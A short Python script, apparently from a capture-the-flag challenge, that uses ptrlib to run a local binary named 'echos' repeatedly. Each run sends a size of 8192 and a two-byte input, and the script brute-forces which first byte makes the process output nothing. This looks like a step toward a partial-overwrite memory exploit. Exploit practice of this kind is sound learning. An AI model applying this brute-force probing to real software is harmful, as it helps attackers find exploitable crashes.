from ptrlib import *
import time

for c in range(0x100):
    sock = Process("./echos")
    sock.sendline("8192")
    sock.sendline(chr(c) + "\xf7")
    time.sleep(0.5)
    if sock.recv() == b'':
        print(hex(c))
    sock.close()
